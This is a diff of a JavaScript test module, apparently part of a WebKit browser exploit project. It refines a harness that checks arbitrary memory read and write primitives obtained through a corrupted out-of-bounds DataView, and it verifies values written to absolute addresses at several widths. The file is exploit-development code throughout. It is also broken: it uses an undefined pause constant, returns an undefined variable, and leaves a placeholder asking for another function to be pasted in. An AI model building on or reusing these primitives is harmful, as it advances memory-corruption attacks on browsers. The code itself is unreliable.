@@ -1,131 +1,195 @@
-// js/script3/testArrayBufferVictimCrash.mjs (Abordagem v22: Teste de Bloco com Primitivas de Baixo Nível e Pausas)
+// js/script3/testArrayBufferVictimCrash.mjs (Abordagem v27: Bloco com "Reset Explícito" do DV)
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
     triggerOOB_primitive,
     clearOOBEnvironment,
     isOOBReady,
-    setup_arb_access,             // <-- NOVA PRIMITIVA DE BAIXO NÍVEL
-    perform_raw_read,             // <-- NOVA PRIMITIVA DE BAIXO NÍVEL
-    perform_raw_write,            // <-- NOVA PRIMITIVA DE BAIXO NÍVEL
-    restore_oob_dv_metadata,      // <-- NOVA PRIMITIVA DE BAIXO NÍVEL
-    // arb_read e arb_write de alto nível podem ser usadas se preferir,
-    // mas para este teste granular, vamos usar as de baixo nível.
-} from '../core_exploit.mjs';     // CERTIFIQUE-SE DE USAR A VERSÃO v22 ACIMA
-import { WEBKIT_LIBRARY_INFO } from '../config.mjs';
+    arb_read,  // Do core_exploit.mjs v27 (síncrona, reutiliza DV, restaura metadados)
+    arb_write, // Do core_exploit.mjs v27
+    oob_read_absolute, // Para operação de "reset explícito"
+    oob_write_absolute // Para operação de "reset explícito"
+} from '../core_exploit.mjs'; 
 
-export const FNAME_MODULE_V28 = "GetterArbitraryRead_v22_BlockRW_LowLevelCtrl";
+export const FNAME_MODULE_V28 = "GetterArbitraryRead_v27_BlockRW_ExplicitDVReset";
 
 // === Constantes ===
-const TEST_BASE_ABSOLUTE_ADDRESS = new AdvancedInt64(0x00000E00, 0x00000000);
-const BLOCK_VALUE_1 = new AdvancedInt64(0xAAAAAAA1, 0x1111111A);
-const BLOCK_VALUE_2 = new AdvancedInt64(0xBBBBBBB2, 0x2222222B);
-const BLOCK_VALUE_3 = new AdvancedInt64(0xCCCCCCC3, 0x3333333C);
-const BLOCK_VALUES = [BLOCK_VALUE_1, BLOCK_VALUE_2, BLOCK_VALUE_3];
-const PAUSE_BETWEEN_BLOCK_OPS_MS = 150;
+const ADDR_A_V27 = new AdvancedInt64(0x00000D00, 0x00000000); // Endereço de referência
+const VAL_A1_V27 = new AdvancedInt64(0x11223344, 0x55667788);
+const VAL_A2_V27 = new AdvancedInt64(0x88776655, 0x44332211);
+
+const BLOCK_ADDR_BASE_V27 = new AdvancedInt64(0x00000E00, 0x00000000);
+const BLOCK_VAL_1_V27 = new AdvancedInt64(0xAAAAAAA1, 0x1111111A);
+const BLOCK_VAL_2_V27 = new AdvancedInt64(0xBBBBBBB2, 0x2222222B);
+const BLOCK_VAL_3_V27 = new AdvancedInt64(0xCCCCCCC3, 0x3333333C);
+const BLOCK_ADDRS_V27 = [BLOCK_ADDR_BASE_V27, BLOCK_ADDR_BASE_V27.add(8), BLOCK_ADDR_BASE_V27.add(16)];
+const BLOCK_VALS_V27 = [BLOCK_VAL_1_V27, BLOCK_VAL_2_V27, BLOCK_VAL_3_V27];
+
+const VAL_32_V27 = 0xDDDDDDDD;
+const VAL_16_V27 = 0xEEEE;
+const VAL_8_V27  = 0xFF;
+
+const PAUSE_OP_V27 = 75;       // Pausa entre operações R/W no mesmo endereço
+const PAUSE_TRANSITION_V27 = 150; // Pausa ao mudar o "contexto" do DV com o reset explícito
+
+let testLog_v27 = [];
+
+function recordResult_v27(step, address, operation, valueWritten, valueExpected, valueReadObj) {
+    // ... (Função recordResult_v26 pode ser reutilizada, apenas renomeie para v27 ou use a mesma) ...
+    // COPIE A VERSÃO CORRIGIDA DE recordResult_v26 AQUI
+    let actualSuccess = false;
+    const valueReadStr = isAdvancedInt64Object(valueReadObj) 
+        ? valueReadObj.toString(true) 
+        : (typeof valueReadObj === 'number' ? toHex(valueReadObj) : String(valueReadObj));
+    const valueExpectedStr = (valueExpected === null || typeof valueExpected === 'undefined') 
+        ? "N/A" 
+        : (isAdvancedInt64Object(valueExpected) ? valueExpected.toString(true) : toHex(valueExpected));
+    const valueWrittenStr = valueWritten 
+        ? (isAdvancedInt64Object(valueWritten) ? valueWritten.toString(true) : toHex(valueWritten)) 
+        : "N/A";
+    const addressStr = address ? address.toString(true) : "N/A";
+
+    if (valueExpected === null || operation.toLowerCase().includes("write only") || operation.toLowerCase().includes("reset dv") || operation.toLowerCase().includes("disturb")) {
+        actualSuccess = true; 
+    } else if (isAdvancedInt64Object(valueExpected)) {
+        actualSuccess = isAdvancedInt64Object(valueReadObj) && valueExpected.equals(valueReadObj);
+    } else if (typeof valueExpected === 'number' && typeof valueReadObj === 'number') {
+        actualSuccess = (valueExpected === valueReadObj);
+    } else { actualSuccess = false; }
+    
+    const entry = { step, address: addressStr, operation, valueWritten: valueWrittenStr, 
+                    valueExpected: valueExpectedStr, valueRead: valueReadStr, success: actualSuccess };
+    testLog_v27.push(entry);
+    const logType = actualSuccess ? "debug" : "error"; // Alterado para debug para sucesso
+    const statusMsg = actualSuccess ? "CORRETO" : "INCORRETO";
+    logS3(`  [${step}] ${operation}: Addr=${entry.address}, Escrito=${entry.valueWritten}, Lido=${entry.valueRead}, Esperado=${entry.valueExpected} - ${statusMsg}`, logType, FNAME_MODULE_V28);
+    return actualSuccess;
+}
+
+// Função para explicitamente "resetar" o DV fazendo-o operar no oob_array_buffer_real
+// Assumimos que arb_read/arb_write restauram o m_vector para o que foi lido de 0x68 (que é 0x0)
+async function explicit_dv_reset(tag) {
+    const FNAME_RESET = `${FNAME_MODULE_V28}.explicit_dv_reset`;
+    logS3(`    ResetDV-${tag}: Forçando operação no oob_array_buffer[0]...`, 'debug', FNAME_RESET);
+    try {
+      if (isOOBReady()){ // Garante que oob_dataview_real e oob_array_buffer_real são válidos
+        const temp_val = oob_read_absolute(0,1); // Lê do oob_array_buffer_real[0]
+        oob_write_absolute(0, temp_val, 1);      // Escreve de volta
+        logS3(`        ResetDV-${tag}: Operação em oob_array_buffer[0] concluída.`, 'debug', FNAME_RESET);
+      } else {
+        logS3(`        ResetDV-${tag}: Ambiente OOB não pronto, pulando reset explícito.`, 'warn', FNAME_RESET);
+      }
+    } catch (e) {
+        logS3(`        ResetDV-${tag}: ERRO durante o reset explícito: ${e.message}`, 'error', FNAME_RESET);
+    }
+    await PAUSE_S3(PAUSE_TRANSITION_V27);
+}
 
 export async function executeArrayBufferVictimCrashTest() {
-    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.testBlockRWWithLowLevelCtrl`;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Testando L/E de Bloco com Controle de Baixo Nível do DV ---`, "test", FNAME_CURRENT_TEST);
+    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.testBlockRWWithExplicitDVReset`;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Teste de Bloco com Reset Explícito do DV (v27) ---`, "test", FNAME_CURRENT_TEST);
     document.title = `${FNAME_MODULE_V28} Inic...`;
+    testLog_v27 = [];
 
     let errorCapturedMain = null;
-    let exploit_result = {
-        success: false,
-        base_address_str: TEST_BASE_ABSOLUTE_ADDRESS.toString(true),
-        values_written_str: BLOCK_VALUES.map(v => v.toString(true)),
-        values_read_back_str: [],
-        verification_details: [],
-        message: "Teste não iniciado."
-    };
+    let overall_test_success = true;
+    let final_message = "Todos os cenários executados.";
 
     try {
         await triggerOOB_primitive({ force_reinit: true });
-        if (!isOOBReady()) {
-            throw new Error("Ambiente OOB inicial não pôde ser configurado.");
-        }
-        logS3("PASSO 1: Ambiente OOB inicial configurado.", "info", FNAME_CURRENT_TEST);
+        if (!isOOBReady()) throw new Error("Ambiente OOB inicial principal não pôde ser configurado.");
+        logS3("PASSO GLOBAL: Ambiente OOB inicial principal configurado.", "info", FNAME_CURRENT_TEST);
 
-        // PASSO 2: Escrever a sequência de valores
-        logS3(`PASSO 2: Escrevendo bloco de ${BLOCK_VALUES.length} valores QWORD começando em ${exploit_result.base_address_str}...`, "info", FNAME_CURRENT_TEST);
-        for (let i = 0; i < BLOCK_VALUES.length; i++) {
-            const current_address = TEST_BASE_ABSOLUTE_ADDRESS.add(i * 8);
-            const value_to_write = BLOCK_VALUES[i];
-            logS3(`  Configurando DV para ${current_address.toString(true)} e escrevendo ${value_to_write.toString(true)}...`, "info", FNAME_CURRENT_TEST);
-            
-            setup_arb_access(current_address); // Configura m_vector e m_length
-            perform_raw_write(0, value_to_write, 8); // Escreve no offset 0 do DV reconfigurado
-            restore_oob_dv_metadata(); // Restaura DV para o estado normal (apontando para oob_array_buffer_real)
-            
-            logS3(`    Escrita e restauração para valor ${i + 1} concluídas. Pausando...`, 'debug', FNAME_CURRENT_TEST);
-            await PAUSE_S3(PAUSE_BETWEEN_BLOCK_OPS_MS);
-        }
-        logS3(`  Escrita do bloco realizada.`, "info", FNAME_CURRENT_TEST);
+        // --- CENÁRIO 1: Teste de Linha de Base (ADDR_A_V27) ---
+        logS3("--- CENÁRIO 1: R/W Sequencial no MESMO endereço (ADDR_A_V27) ---", "subtest", FNAME_CURRENT_TEST);
+        arb_write(ADDR_A_V27, VAL_A1_V27, 8); 
+        if(!recordResult_v27("1.1", ADDR_A_V27, "Write/Read VAL_A1", VAL_A1_V27, VAL_A1_V27, arb_read(ADDR_A_V27, 8))) overall_test_success = false;
+        await explicit_dv_reset("1_A");
+        arb_write(ADDR_A_V27, VAL_A2_V27, 8); 
+        if(!recordResult_v27("1.2", ADDR_A_V27, "Write/Read VAL_A2", VAL_A2_V27, VAL_A2_V27, arb_read(ADDR_A_V27, 8))) overall_test_success = false;
+        await explicit_dv_reset("1_B");
+        if(!recordResult_v27("1.3", ADDR_A_V27, "Read Final VAL_A2", null, VAL_A2_V27, arb_read(ADDR_A_V27, 8))) overall_test_success = false;
 
-        await PAUSE_S3(PAUSE_BETWEEN_BLOCK_OPS_MS * 2); // Pausa maior antes de ler
-
-        // PASSO 3: Ler de volta os valores do bloco individualmente e verificar
-        logS3(`PASSO 3: Lendo de volta os valores do bloco individualmente...`, "info", FNAME_CURRENT_TEST);
-        let all_values_match = true;
-        for (let i = 0; i < BLOCK_VALUES.length; i++) {
-            const current_address = TEST_BASE_ABSOLUTE_ADDRESS.add(i * 8);
-            const expected_value = BLOCK_VALUES[i];
-            
-            logS3(`  Configurando DV para ${current_address.toString(true)} para leitura do valor ${i + 1}...`, 'info', FNAME_CURRENT_TEST);
-            setup_arb_access(current_address);
-            const read_value_obj = perform_raw_read(0, 8); // Lê do offset 0 do DV reconfigurado
-            restore_oob_dv_metadata();
-            
-            const read_value_str = isAdvancedInt64Object(read_value_obj) ? read_value_obj.toString(true) : "ERRO_LEITURA_BLOCO";
-            exploit_result.values_read_back_str.push(read_value_str);
-            
-            const verification_msg = `  Lido de ${current_address.toString(true)}: ${read_value_str} (Esperado: ${expected_value.toString(true)})`;
-            if (read_value_str === expected_value.toString(true)) {
-                logS3(verification_msg + " - CORRETO!", "good", FNAME_CURRENT_TEST);
-                exploit_result.verification_details.push({offset: i*8, read: read_value_str, expected: expected_value.toString(true), match: true});
-            } else {
-                logS3(verification_msg + " - INCORRETO!", "error", FNAME_CURRENT_TEST);
-                exploit_result.verification_details.push({offset: i*8, read: read_value_str, expected: expected_value.toString(true), match: false});
-                all_values_match = false;
-            }
-            logS3(`    Leitura e restauração para valor ${i + 1} concluídas. Pausando...`, 'debug', FNAME_CURRENT_TEST);
-            await PAUSE_S3(PAUSE_BETWEEN_BLOCK_OPS_MS);
-        }
-
-        if (!all_values_match) {
-            exploit_result.message = `Falha na verificação do bloco de dados em ${exploit_result.base_address_str} (com controle de baixo nível do DV).`;
-        } else {
-            exploit_result.success = true;
-            exploit_result.message = `SUCESSO! Bloco de dados escrito e lido corretamente do endereço base ${exploit_result.base_address_str} (com controle de baixo nível do DV).`;
+        // --- CENÁRIO 2: R/W em Bloco com Reset Explícito do DV ---
+        logS3("--- CENÁRIO 2: R/W em Bloco com Reset Explícito do DV ---", "subtest", FNAME_CURRENT_TEST);
+        // Fase de Escrita do Bloco
+        for (let i = 0; i < BLOCK_ADDRS_V27.length; i++) {
+            const current_address = BLOCK_ADDRS_V27[i];
+            const value_to_write = BLOCK_VALS_V27[i];
+            logS3(`  C2.Write.${i}: Escrevendo ${value_to_write.toString(true)} em ${current_address.toString(true)}`, 'info', FNAME_CURRENT_TEST);
+            arb_write(current_address, value_to_write, 8);
+            // Leitura imediata para verificar
+            if(!recordResult_v27(`C2.WriteRead.${i}`, current_address, `Write/Read Bloco Val ${i}`, value_to_write, value_to_write, arb_read(current_address, 8))) overall_test_success = false;
+            await explicit_dv_reset(`PostWrite-${i}`); // Reset explícito após operar no endereço do bloco
         }
         
-        if (exploit_result.success) {
-            logS3(`  !!!! ${exploit_result.message} !!!!`, "vuln", FNAME_CURRENT_TEST);
-            document.title = `${FNAME_MODULE_V28}: ARB BLOCK LOWLVL OK!`;
-        } else {
-            logS3(exploit_result.message, "error", FNAME_CURRENT_TEST);
-            document.title = `${FNAME_MODULE_V28}: Falha Bloco (LowLvl)`;
+        logS3("  C2: Pausa MUITO Longa (" + PAUSE_VERY_LONG_V26 + "ms) antes da leitura final do bloco...", "warn", FNAME_CURRENT_TEST);
+        await PAUSE_S3(PAUSE_VERY_LONG_V26); // PAUSE_VERY_LONG_V26 é do script v26, precisa definir ou usar PAUSE_LONG_V27
+
+        // Fase de Leitura do Bloco (Verificação Final)
+        logS3("  C2: Lendo o bloco para verificação final...", "info", FNAME_CURRENT_TEST);
+        for (let i = 0; i < BLOCK_ADDRS_V27.length; i++) {
+            const current_address = BLOCK_ADDRS_V27[i];
+            const expected_value = BLOCK_VALS_V27[i];
+            await explicit_dv_reset(`PreRead-${i}`); // Reset explícito ANTES de ler o endereço do bloco
+            if(!recordResult_v27(`C2.FinalRead.${i}`, current_address, `Read Final Bloco Val ${i}`, null, expected_value, arb_read(current_address, 8))) overall_test_success = false;
         }
+
+        // CENÁRIO 3 Simplificado para focar na L/E de diferentes tamanhos sem a complexa verificação consolidada
+        logS3("--- CENÁRIO 3: R/W Diferentes Tamanhos (ADDR_A_V27) ---", "subtest", FNAME_CURRENT_TEST);
+        await explicit_dv_reset("Pre-C3");
+        arb_write(ADDR_A_V27, VAL_A1_V27, 8); 
+        if(!recordResult_v27("3.1", ADDR_A_V27, "Write/Read VAL_A1_V27 (64b)", VAL_A1_V27, VAL_A1_V27, arb_read(ADDR_A_V27, 8))) overall_test_success = false;
+        
+        await explicit_dv_reset("Post-3.1");
+        arb_write(ADDR_A_V27, VAL_32_V27, 4); 
+        if(!recordResult_v27("3.2", ADDR_A_V27, "Write/Read VAL_32_V27 (32b)", VAL_32_V27, VAL_32_V27, arb_read(ADDR_A_V27, 4))) overall_test_success = false;
+        
+        await explicit_dv_reset("Post-3.2");
+        // Verifica se a parte alta de VAL_A1_V27 foi preservada
+        const high_part_val_a1_read = arb_read(ADDR_A_V27.add(4), 4);
+        if(!recordResult_v27("3.3", ADDR_A_V27.add(4), "Read High Part of VAL_A1_V27 (32b)", null, VAL_A1_V27.high(), high_part_val_a1_read )) overall_test_success = false;
+
+        await explicit_dv_reset("Post-3.3");
+        arb_write(ADDR_A_V27, VAL_16_V27, 2); 
+        if(!recordResult_v27("3.4", ADDR_A_V27, "Write/Read VAL_16_V27 (16b)", VAL_16_V27, VAL_16_V27, arb_read(ADDR_A_V27, 2))) overall_test_success = false;
+
+        await explicit_dv_reset("Post-3.4");
+        arb_write(ADDR_A_V27, VAL_8_V27, 1);  
+        if(!recordResult_v27("3.5", ADDR_A_V27, "Write/Read VAL_8_V27 (8b)", VAL_8_V27, VAL_8_V27, arb_read(ADDR_A_V27, 1))) overall_test_success = false;
+
+        // Verificação final consolidada do byte 0 após todas as escritas parciais
+        await explicit_dv_reset("Post-3.5");
+        const final_byte0_read = arb_read(ADDR_A_V27, 1);
+        if(!recordResult_v27("3.6", ADDR_A_V27, "Read Final Byte0 de ADDR_A_V27", null, VAL_8_V27, final_byte0_read)) overall_test_success = false;
+
+
+        if (testLog_v27.every(r => r.success)) {
+            overall_test_success = true; // Define apenas se TUDO passou
+            final_message = "SUCESSO GERAL: Todos os passos individuais dos cenários de teste (v27) passaram.";
+        } else {
+            overall_test_success = false;
+            final_message = "FALHA PARCIAL: Um ou mais passos individuais nos cenários de teste (v27) falharam.";
+        }
+        logS3(`MSG FINAL: ${final_message}`, overall_test_success ? "vuln" : "error", FNAME_CURRENT_TEST);
+        document.title = `${FNAME_MODULE_V28}: ${overall_test_success ? "V27 OK" : "V27 FALHA"}`;
 
     } catch (e_outer_main) {
         errorCapturedMain = e_outer_main;
         logS3(`ERRO CRÍTICO GERAL: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
         if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
-        exploit_result.message = `Erro geral: ${e_outer_main.name} - ${e_outer_main.message}`;
+        final_message = `Erro geral: ${e_outer_main.name} - ${e_outer_main.message}`;
         document.title = `${FNAME_MODULE_V28} ERRO CRÍTICO`;
-        exploit_result.success = false;
+        overall_test_success = false;
     } finally {
         clearOOBEnvironment({force_clear_even_if_not_setup: true});
         logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
-        // ... (logs de resultado como antes) ...
-        logS3(`Resultado Teste L/E de Bloco com Controle Baixo Nível DV (v22): Success=${exploit_result.success}, Msg='${exploit_result.message}'`, exploit_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
-        exploit_result.verification_details.forEach(detail => {
-            logS3(`    Verificação Bloco Offset +${detail.offset}: Lido=${detail.read}, Esperado=${detail.expected}, Match=${detail.match}`, detail.match ? "debug" : "error", FNAME_CURRENT_TEST);
+        logS3(`Resultado Final Testes com Reset Explícito DV (v27): Success=${overall_test_success}, Msg='${final_message}'`, overall_test_success ? "good" : "warn", FNAME_CURRENT_TEST);
+        testLog_v27.forEach(res => {
+            const successString = res.success ? "OK" : `FALHA (Erro: ${res.error || 'Valor Incorreto'})`;
+            logS3(`  [${res.step}] Addr=${res.address}, Op=${res.operation}, W=${res.valueWritten}, R=${res.valueRead}, E=${res.valueExpected} => ${successString}`, 
+                  res.success ? "info" : "error", FNAME_MODULE_V28 + ".Details");
         });
     }
-
-    return {
-        errorOccurred: errorCapturedMain,
-        exploit_attempt_result: exploit_result,
-    };
+    return { errorCapturedMain, overall_success, final_message, test_log_details: testLog_v27 };
 }
